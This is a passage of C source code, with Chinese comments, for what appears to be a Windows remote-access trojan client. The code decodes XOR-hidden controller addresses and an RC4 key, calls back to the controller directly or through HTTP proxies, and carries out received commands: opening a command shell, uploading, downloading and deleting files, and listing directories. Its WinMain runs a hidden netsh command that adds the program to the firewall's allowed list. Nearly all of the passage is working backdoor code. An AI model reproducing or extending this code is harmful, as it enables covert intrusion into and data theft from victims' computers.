                closesocket(ServerSocket);
                return -1;
            }
            rc4_crypt(S_box,(unsigned char *)RecvBuffer,RecvSize);
            //MessageBox(NULL,RecvBuffer,"recv",MB_OK);
            pEnd=strchr(RecvBuffer,'|');
            if(pEnd!=NULL)
            {
                pStart=RecvBuffer;
                if(!strncmp(pStart,"delete",pEnd-pStart))
                {
                    pStart=pEnd+1;
                    remove(pStart);
                    continue;
                }
            }
            if(achieve_file_list(RecvBuffer,&folders_buffer,&files_buffer)==-1)
                continue;
            send_flag=2;
            k=0;
        }
        if(send_flag)
        {
            do
            {
                if(send_flag==2)
                {
                    memset(&FES,NULL,sizeof(FileExplorerStruct));
                    if(folders_buffer==NULL)
                    {
                        send_flag=3;
                        continue;
                    }
                    for(i=0; i<=sizeof(FES.content) && folders_buffer[k]!=NULL; i++,k++)
                        FES.content[i]=folders_buffer[k];
                    if(folders_buffer[k]==NULL && FES.content[0]!=NULL)
                        FES.end_flag=0;     //发送将完成
                    else
                        FES.end_flag=1;
                    if(folders_buffer[k]==NULL && FES.content[0]==NULL)
                    {
                        send_flag=3;
                        k=0;
                        free(folders_buffer);
                        folders_buffer=NULL;
                    }
                    FES.type_flag=2;
                }
                if(send_flag==3)
                {
                    memset(&FES,NULL,sizeof(FileExplorerStruct));
                    if(files_buffer==NULL)
                        break;
                    for(i=0; i<=sizeof(FES.content) && files_buffer[k]!=NULL; i++,k++)
                        FES.content[i]=files_buffer[k];
                    if(files_buffer[k]==NULL && FES.content[0]!=NULL)
                        FES.end_flag=0;     //发送将完成
                    else
                        FES.end_flag=1;
                    if(files_buffer[k]==NULL && FES.content[0]==NULL)
                    {
                        send_flag=0;
                        free(files_buffer);
                        files_buffer=NULL;
                        break;
                    }
                    FES.type_flag=3;
                }
                if(CI.HTTP_Proxy)
                    if(Send_HTTP_Header(ServerSocket,sizeof(FileExplorerStruct),Need_Pass)!=0)
                        return -1;
                rc4_crypt(S_box,(unsigned char *)&FES,sizeof(FileExplorerStruct));
                if(send(ServerSocket,(char *)&FES,sizeof(FileExplorerStruct),0)<=0)
                {
                    closesocket(ServerSocket);
                    return -1;
                }
                if(CI.HTTP_Proxy)
                    for(n=0; n<10; n++)
                    {
                        //过滤HTTP_Header
                        memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                        if(recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
                        {
                            //puts("从服务端接收命令失败.");
                            closesocket(ServerSocket);
                            return -1;
                        }
                        if(!strcmp(RecvBuffer,"Continue"))
                            break;
                    }
            }
            while(send_flag>=2);
            send_flag=0;
        }
        else
            Sleep(10);
    }
    return 0;
}

int Listen_Server(SOCKET ServerSocket)
{
    fd_set readfd;
    char RecvBuffer[MAX_SIZE+1],SendBuffer[MAX_SIZE];
    char *pStart=NULL,*pEnd=NULL,*http_buffer=NULL;
    struct sockaddr_in TempAddr;
    struct timeval WaitTime;
    FILE *cmdfile=NULL,*UploadFile=NULL,*DownloadFile=NULL;
    int readresultfile_flag=0,send_flag=0,auth_flag=0;
    int PacketSize=0,write_len=0,sur_len=0,ret=0,i=0,SendSize=0;
    unsigned long FileSize;
    TempStruct RF;
    HANDLE hThread;

    if(!CI.HTTP_Proxy)
        try_reconnect_number=0;
    WaitTime.tv_sec=1;
    WaitTime.tv_usec=0;

    while(1)
    {
        FD_ZERO(&readfd);
        FD_SET(ServerSocket,&readfd);
        if(select(-1,&readfd,NULL,NULL,&WaitTime)>0)
        {
            if(FD_ISSET(ServerSocket,&readfd))
            {
                //套接字可读
                memset(&RecvBuffer,NULL,sizeof(RecvBuffer));
                if((PacketSize=recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0))<=0)
                {
                    //printf("与服务端断开连接。(接收数据失败)\n");
                    closesocket(ServerSocket);
                    return -1;
                }

                if(CI.HTTP_Proxy)
                    if(!auth_flag)
                        if(strstr(RecvBuffer,"Unauthorized"))
                            return -1;
                        else
                            auth_flag=1;

                try_reconnect_number=0;
                rc4_crypt(S_box,(unsigned char *)RecvBuffer,PacketSize);    //解密指令
                //MessageBox(NULL,RecvBuffer,"recv",MB_OK);
                if(pStart=strstr(RecvBuffer,"Execute_Command"))
                {
                    //执行命令
                    //printf("反弹交互命令行.\n");

                    CloseHandle((hThread=CreateThread(NULL,0,Execute_Command,NULL,0,NULL)));
                }
                else if(pStart=strstr(RecvBuffer,"Upload_File"))
                {
                    //上传文件
                    pStart=strchr(pStart,':');
                    pStart++;
                    memset(SendBuffer,NULL,sizeof(SendBuffer));
                    //printf("文件:%s将上传\n",pStart);
                    switch(mkdirs(pStart,&UploadFile))
                    {
                    case -1:
                        //创建目录或文件失败
                        strcat(SendBuffer,"CreateFileFailed:");
                        send_flag++;
                        break;
                    default:
                        //创建目录及文件成功
                        memset(&RF,NULL,sizeof(TempStruct));
                        if(CI.HTTP_Proxy==1)
                        {
                            //若用到HTTP隧道则连接到代理服务器
                            strcat(RF.ip,Proxy_IP);
                            RF.port=Proxy_Port;
                        }
                        else
                        {
                            strcat(RF.ip,Server_IP);
                            RF.port=Server_Port;
                        }
                        RF.file=UploadFile;
                        RF.ServerSocket=ServerSocket;
                        memset(&TempAddr,NULL,sizeof(struct sockaddr_in));
                        RF.TranSocket=ConnectToServer(&TempAddr,RF.ip,RF.port);
                        CloseHandle((hThread=CreateThread(NULL,0,Recv_File,(LPVOID)&RF,0,NULL)));   //接收文件线程
                        Sleep(1);
                        break;
                    }
                }
                else if(pStart=strstr(RecvBuffer,"Download_File"))
                {
                    //下载文件
                    pStart=strchr(pStart,':');
                    pStart++;
                    memset(SendBuffer,NULL,sizeof(SendBuffer));
                    memset(&RF,NULL,sizeof(TempStruct));
                    memset(&TempAddr,NULL,sizeof(struct sockaddr_in));

                    DownloadFile=fopen(pStart,"rb");
                    if(CI.HTTP_Proxy==1)
                    {
                        strcat(RF.ip,Proxy_IP);
                        RF.port=Proxy_Port;
                    }
                    else
                    {
                        strcat(RF.ip,Server_IP);
                        RF.port=Server_Port;
                    }
                    RF.file=DownloadFile;
                    RF.ServerSocket=ServerSocket;
                    if(DownloadFile==NULL || (RF.TranSocket=ConnectToServer(&TempAddr,RF.ip,RF.port))==INVALID_SOCKET)
                    {
                        //下载文件过程出错
                        sprintf(SendBuffer,"Download_File_Failed:open file \"%s\" failed",pStart);
                        send_flag++;
                    }
                    else
                    {
                        fseek(RF.file,0,SEEK_END);
                        FileSize=ftell(RF.file);     //获取文件大小
                        fseek(RF.file,0,SEEK_SET);

                        CloseHandle((hThread=CreateThread(NULL,0,Send_File,(LPVOID)&RF,0,NULL)));    //新建文件发送线程
                        sprintf(SendBuffer,"Download_File_Start:%ld",FileSize);   //发送文件开始下载消息
                        send_flag++;
                    }
                }
                else if(pStart=strstr(RecvBuffer,"Disconnect"))
                {
                    disconnect=1;
                    closesocket(ServerSocket);
                    Sleep(3000);    //3秒后强行退出程序
                    exit(-1);
                }
                else if(pStart=strstr(RecvBuffer,"File_Explorer"))
                {
                    CloseHandle((hThread=CreateThread(NULL,0,file_explorer,NULL,0,NULL)));
                }
            }
            if(send_flag)
            {
                EnterCriticalSection(&CRI_SOC);
                SendSize=strlen(SendBuffer);
                if(CI.HTTP_Proxy)
                {
                    //若通过HTTP代理则需要先发送HTTP_Header
                    if(Send_HTTP_Header(ServerSocket,SendSize,Need_Pass)!=0)
                        return -1;
                }
                rc4_crypt(S_box,(unsigned char *)SendBuffer,SendSize);
                if(send(ServerSocket,SendBuffer,SendSize,0)<=0)
                {
                    //printf("与服务端断开连接。(发送数据失败)\n");
                    closesocket(ServerSocket);
                    return -1;
                }
                //MessageBox(NULL,SendBuffer,"Information",MB_OK);
                LeaveCriticalSection(&CRI_SOC);
                send_flag--;
                if(CI.HTTP_Proxy) //Sleep(50);
                {
                    //若通过HTTP代理则需要接收HTTP_Header
                    for(i=0; i<10; i++)
                    {
                        memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                        if(recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
                        {
                            //printf("接收HTTP_Header失败。\n");
                            return -1;
                        }
                        pStart=strstr(RecvBuffer,"Continue");
                        if(pStart!=NULL)
                            break;
                    }
                }
            }
        }
    }
    return 0;
}

int StartConnect(char *ip,int port)
{
    SOCKET ServerSocket=INVALID_SOCKET;
    struct sockaddr_in ServerAddress;

    memset(&ServerAddress,NULL,sizeof(struct sockaddr_in));

    if((ServerSocket=ConnectToServer(&ServerAddress,ip,port))==INVALID_SOCKET)
    {
        //printf("连接至服务器失败。\n");
        closesocket(ServerSocket);
        return -1;
    }
    if(SendComputerInfo(ServerSocket,NULL,NULL,NULL)!=0)
    {
        //printf("发送计算机信息失败.\n");
        closesocket(ServerSocket);
        return -1;
    }

    return Listen_Server(ServerSocket);
}

int StartConnectByProxy(char *ServerIP,int ServerPort,char *ProxyIP,int ProxyPort,char *Pass)
{
    SOCKET ProxySocket=INVALID_SOCKET;
    struct sockaddr_in ProxyAddress;

    memset(&ProxyAddress,NULL,sizeof(struct sockaddr_in));

    if(Pass && strlen(Pass)>1)
    {
        Need_Pass=1;
        ProxyPass_base64=(char *)base64Encode(Pass,strlen(Pass));
    }
    ProxySocket=ConnectToServer(&ProxyAddress,ProxyIP,ProxyPort);     //连接到代理服务器
    if(ProxySocket==NULL)
    {
        //printf("连接至HTTP代理服务器失败.\n");
        return -1;
    }
    if(Pass && strlen(Pass)>1)
    {
        //有验证的代理
        if(SendComputerInfo(ProxySocket,ServerIP,ServerPort,ProxyPass_base64)!=0)
        {
            //printf("发送计算机信息失败.\n");
            closesocket(ProxySocket);
            return -1;
        }
    }
    else
    {
        //无验证的代理
        if(SendComputerInfo(ProxySocket,ServerIP,ServerPort,NULL)!=0)
        {
            //printf("发送计算机信息失败.\n");
            closesocket(ProxySocket);
            return -1;
        }
    }
    CloseHandle(CreateThread(NULL,0,Keep_Alive,(LPVOID)&ProxySocket,0,NULL));  //创建心跳机制线程
    return Listen_Server(ProxySocket);

    return 0;
}

int DNSQuery(char *domain,char *ipaddress)
{
    char **tmp=NULL;
    struct hostent *Target;
    struct in_addr addr;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2),&wsa);
    Target=gethostbyname(domain);
    if(Target==NULL)
    {
        //域名解析失败
        WSACleanup();
        return -1;
    }
    tmp=Target->h_addr_list;
    if(*tmp!=NULL)
    {
        memcpy(&addr.S_un.S_addr,*tmp,Target->h_length);
        memset(ipaddress,NULL,sizeof(16));
        strcat(ipaddress,inet_ntoa(addr));
    }
    else
    {
        WSACleanup();
        return -1;
    }

    WSACleanup();
    return 0;
}

int check_domain(char *str)
{
    //返回1表示是域名，0表示是IP地址
    char *p=NULL;

    for(p=str; *p!=NULL; p++)
    {
        if(*p=='.') continue;
        if(*p<'0' || *p>'9')
            return 1;
    }

    return 0;
}

int analysis_connect_info()
{
    char *pStart=NULL,Domain[50];
    char tmp=85;
    int i;

    memset(Server_IP,NULL,sizeof(Server_IP));
    memset(Proxy_IP,NULL,sizeof(Proxy_IP));
    memset(Proxy_Username,NULL,sizeof(Proxy_Username));
    memset(Proxy_Password,NULL,sizeof(Proxy_Password));
    memset(RC4_KEY,NULL,sizeof(RC4_KEY));
    memset(S_box,NULL,sizeof(S_box));

    for(pStart=_RC4_KEY,i=0; i<256; pStart++,i++)
        *pStart^=tmp;
    pStart=strchr(_RC4_KEY,':');
    pStart++;
    memcpy(RC4_KEY,pStart,248);

    for(pStart=SERVER_IP,i=0; i<50; pStart++,i++)
        *pStart^=tmp;
    pStart=strchr(SERVER_IP,':');
    pStart++;
    memset(Domain,NULL,sizeof(Domain));
    memcpy(Domain,pStart,16);
    if(check_domain(Domain))
    {
        //服务端地址是域名
        if(DNSQuery(Domain,Server_IP)!=0)    //解析域名
            exit(-1);
    }
    else
        memcpy(Server_IP,Domain,16);

    for(pStart=SERVER_PORT,i=0; i<50; pStart++,i++)
        *pStart^=tmp;
    pStart=strchr(SERVER_PORT,':');
    pStart++;
    Server_Port=atoi(pStart);

    for(pStart=PROXY_IP,i=0; i<50; pStart++,i++)
        *pStart^=tmp;
    pStart=strchr(PROXY_IP,':');
    pStart++;
    memset(Domain,NULL,sizeof(Domain));
    memcpy(Domain,pStart,16);
    if(check_domain(Domain))
    {
        //服务端地址是域名
        if(DNSQuery(Domain,Proxy_IP)!=0)    //解析域名
            exit(-1);
    }
    else
        memcpy(Proxy_IP,Domain,16);

    for(pStart=PROXY_PORT,i=0; i<50; pStart++,i++)
        *pStart^=tmp;
    pStart=strchr(PROXY_PORT,':');
    pStart++;
    Proxy_Port=atoi(pStart);

    for(pStart=PROXY_USERNAME,i=0; i<50; pStart++,i++)
        *pStart^=tmp;
    pStart=strchr(PROXY_USERNAME,':');
    pStart++;
    memcpy(Proxy_Username,pStart,19);

    for(pStart=PROXY_PASSWORD,i=0; i<50; pStart++,i++)
        *pStart^=tmp;
    pStart=strchr(PROXY_PASSWORD,':');
    pStart++;
    memcpy(Proxy_Password,pStart,19);

    return 0;
}

int query_reg()
{
    HKEY hKey;
    char Key_Data[300],*pStart=NULL,*pEnd=NULL;
    DWORD Key_Type=0,Key_Data_Length=0;

    char *item="Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings";

    if(RegOpenKeyEx(HKEY_CURRENT_USER,item,0,KEY_ALL_ACCESS,&hKey)!=ERROR_SUCCESS)
    {
        RegCloseKey(hKey);        //关闭注册表句柄
        return -1;
    }
    Key_Data_Length=sizeof(Key_Data);
    int ret;
    char str[100]= {0};
    if(RegQueryValueEx(hKey,"ProxyServer",NULL,&Key_Type,(BYTE *)Key_Data,&Key_Data_Length)!=ERROR_SUCCESS)
    {
        //不存在此键
        return -1;
    }

    if(strlen(Key_Data)<1)
        return -2;
    memset(Proxy_IP,NULL,sizeof(Proxy_IP));
    memset(Proxy_Username,NULL,sizeof(Proxy_Username));
    memset(Proxy_Password,NULL,sizeof(Proxy_Password));

    pStart=Key_Data;
    pEnd=strchr(Key_Data,':');
    if(pEnd==NULL)
        return -2;
    memcpy(Proxy_IP,Key_Data,pEnd-pStart);
    pStart=++pEnd;
    Proxy_Port=atoi(pStart);

    return 0;
}

int start(int argc,char argv[10][256])
{
    int ret=-1,n=0;
    char *pStart=NULL,*pEnd=NULL,proxy_pass[50];

    memset(Server_IP,NULL,sizeof(Server_IP));
    memset(Proxy_IP,NULL,sizeof(Proxy_IP));
    memset(proxy_pass,NULL,sizeof(proxy_pass));

    InitializeCriticalSection(&CRI_SOC);       //初始化临界区对象
    analysis_connect_info();
    rc4_init(S_box,RC4_KEY,strlen((const char *)RC4_KEY));        //初始化密钥

    switch (argc)
    {
    case 1:
        //默认先用IE代理回连，再直接回连
        for(try_reconnect_number=0; try_reconnect_number<reconnect_number && ret==-1; try_reconnect_number++,Sleep(time_interval))
        {
            if(query_reg()==0)
            {
                HTTP_connect_flag=1;
                ret=StartConnectByProxy(Server_IP,Server_Port,Proxy_IP,Proxy_Port,NULL);
            }
            HTTP_connect_flag=0;
            ret=StartConnect(Server_IP,Server_Port);
        }
        break;
    case 2:
        if(strcmp(argv[1],"-e")==0)
        {
            //通过内嵌配置回连
            HTTP_connect_flag=0;
            for(try_reconnect_number=0; try_reconnect_number<reconnect_number && ret==-1; try_reconnect_number++,Sleep(time_interval))
                ret=StartConnect(Server_IP,Server_Port);
        }
        else if(strcmp(argv[1],"-p")==0)
        {
            //通过默认HTTP回连
            HTTP_connect_flag=1;
            sprintf(proxy_pass,"%s:%s",Proxy_Username,Proxy_Password);
            for(try_reconnect_number=0; try_reconnect_number<reconnect_number && ret==-1; try_reconnect_number++,Sleep(time_interval))
                ret=StartConnectByProxy(Server_IP,Server_Port,Proxy_IP,Proxy_Port,proxy_pass);
        }
        break;
    case 3:
        //回连指定IP
        memset(Server_IP,NULL,sizeof(Server_IP));
        if (strlen(argv[1])>16)
            return -1;
        strcat(Server_IP,argv[1]);
        Server_Port=atoi(argv[2]);
        HTTP_connect_flag=0;
        for(try_reconnect_number=0; try_reconnect_number<reconnect_number && ret==-1; try_reconnect_number++,Sleep(time_interval))
            ret=StartConnect(Server_IP,Server_Port);
        break;
    case 5:
        //通过指定http代理(无验证)
        memset(Server_IP,NULL,sizeof(Server_IP));
        memset(Proxy_IP,NULL,sizeof(Proxy_IP));

        HTTP_connect_flag=1;
        if((pEnd=strchr(argv[2],':'))==NULL) return -1;
        memcpy(Proxy_IP,argv[2],pEnd-argv[2]);         //获取代理服务器IP
        pStart=++pEnd;
        Proxy_Port=atoi(pStart);                       //获取代理服务器端口
        strcat(Server_IP,argv[3]);                     //获取服务端IP
        Server_Port=atoi(argv[4]);                     //获取服务端端口
        for(try_reconnect_number=0; try_reconnect_number<reconnect_number && ret==-1; try_reconnect_number++,Sleep(time_interval))
            ret=StartConnectByProxy(Server_IP,Server_Port,Proxy_IP,Proxy_Port,NULL);
        break;
    case 7:
        //通过指定http代理(有验证)
        memset(Server_IP,NULL,sizeof(Server_IP));
        memset(Proxy_IP,NULL,sizeof(Proxy_IP));

        HTTP_connect_flag=1;
        if((pEnd=strchr(argv[2],':'))==NULL) return -1;
        memcpy(Proxy_IP,argv[2],pEnd-argv[2]);         //获取代理服务器IP
        pStart=++pEnd;
        Proxy_Port=atoi(pStart);                       //获取代理服务器端口
        strcat(Server_IP,argv[5]);                     //获取服务端IP
        Server_Port=atoi(argv[6]);                     //获取服务端端口
        for(try_reconnect_number=0; try_reconnect_number<reconnect_number && ret==-1; try_reconnect_number++,Sleep(time_interval))
            ret=StartConnectByProxy(Server_IP,Server_Port,Proxy_IP,Proxy_Port,argv[4]);
        break;
    default:
        break;
    }

    exit(0);
}

int WINAPI WinMain(HINSTANCE h1,HINSTANCE h2,LPTSTR cmdline,int cmdshow)
{
    int argc=0;
    char *p=NULL;
    char argv[10][256];
    char cmd[300];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    memset(&argv[0][0],NULL,sizeof(char)*2560);
    memset(cmd,NULL,sizeof(cmd));
    memset(&si,NULL,sizeof(STARTUPINFO));
    memset(&pi,NULL,sizeof(PROCESS_INFORMATION));

    GetModuleFileName(NULL,argv[argc],256);

    si.cb=sizeof(STARTUPINFO);
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    sprintf(cmd,"cmd.exe /c netsh firewall set allowedprogram %s A ENABLE",argv[argc]);   //添加防火墙放行名单
    CreateProcess(NULL,cmd,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    p=strtok(cmdline," ");
    for(argc++; argc<10; argc++)
    {
        if(p==NULL) break;
        strcat(argv[argc],p);
        p=strtok(NULL," ");
    }

    start(argc,argv);

    return 0;
}
